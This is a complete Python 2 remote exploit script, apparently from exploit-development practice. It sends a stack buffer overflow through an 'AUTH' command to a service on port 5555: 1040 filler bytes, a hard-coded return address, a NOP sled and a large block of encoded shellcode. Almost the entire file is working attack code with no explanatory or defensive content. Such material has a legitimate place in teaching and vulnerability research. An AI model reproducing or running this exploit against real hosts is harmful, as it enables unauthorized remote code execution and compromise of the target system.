#!/usr/bin/python

import time, struct, sys
import socket as so

# Address=65D11D71

#for x in range(0,255):
#    badchars += ('\\x' + '{:02x}'.format(x))
#
#
#
ret_eip="\x71\x1d\xd1\x65"
bad="\x00"
shellcode=(
"\xb8\x5e\x6d\x04\x1b\xd9\xcc\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\x9d\x69\xe6\xee\xdd\x9a\x64"
"\x10\x1d\x5b\x09\x98\xf8\x6a\x09\xfe\x89\xdd\xb9\x74\xdf\xd1"
"\x32\xd8\xcb\x62\x36\xf5\xfc\xc3\xfd\x23\x33\xd3\xae\x10\x52"
"\x57\xad\x44\xb4\x66\x7e\x99\xb5\xaf\x63\x50\xe7\x78\xef\xc7"
"\x17\x0c\xa5\xdb\x9c\x5e\x2b\x5c\x41\x16\x4a\x4d\xd4\x2c\x15"
"\x4d\xd7\xe1\x2d\xc4\xcf\xe6\x08\x9e\x64\xdc\xe7\x21\xac\x2c"
"\x07\x8d\x91\x80\xfa\xcf\xd6\x27\xe5\xa5\x2e\x54\x98\xbd\xf5"
"\x26\x46\x4b\xed\x81\x0d\xeb\xc9\x30\xc1\x6a\x9a\x3f\xae\xf9"
"\xc4\x23\x31\x2d\x7f\x5f\xba\xd0\xaf\xe9\xf8\xf6\x6b\xb1\x5b"
"\x96\x2a\x1f\x0d\xa7\x2c\xc0\xf2\x0d\x27\xed\xe7\x3f\x6a\x7a"
"\xcb\x0d\x94\x7a\x43\x05\xe7\x48\xcc\xbd\x6f\xe1\x85\x1b\x68"
"\x06\xbc\xdc\xe6\xf9\x3f\x1d\x2f\x3e\x6b\x4d\x47\x97\x14\x06"
"\x97\x18\xc1\x89\xc7\xb6\xba\x69\xb7\x76\x6b\x02\xdd\x78\x54"
"\x32\xde\x52\xfd\xd9\x25\x35\x08\x15\x25\x76\x64\x2b\x25\x79"
"\xce\xa2\xc3\x13\x20\xe3\x5c\x8c\xd9\xae\x16\x2d\x25\x65\x53"
"\x6d\xad\x8a\xa4\x20\x46\xe6\xb6\xd5\xa6\xbd\xe4\x70\xb8\x6b"
"\x80\x1f\x2b\xf0\x50\x69\x50\xaf\x07\x3e\xa6\xa6\xcd\xd2\x91"
"\x10\xf3\x2e\x47\x5a\xb7\xf4\xb4\x65\x36\x78\x80\x41\x28\x44"
"\x09\xce\x1c\x18\x5c\x98\xca\xde\x36\x6a\xa4\x88\xe5\x24\x20"
"\x4c\xc6\xf6\x36\x51\x03\x81\xd6\xe0\xfa\xd4\xe9\xcd\x6a\xd1"
"\x92\x33\x0b\x1e\x49\xf0\x3b\x55\xd3\x51\xd4\x30\x86\xe3\xb9"
"\xc2\x7d\x27\xc4\x40\x77\xd8\x33\x58\xf2\xdd\x78\xde\xef\xaf"
"\x11\x8b\x0f\x03\x11\x9e")

try:
    server = sys.argv[1]
    port = 5555


except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x41"*1040 + ret_eip + "\x90" * 16 + shellcode
s = so.socket(so.AF_INET, so.SOCK_STREAM)

try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"

s.close()
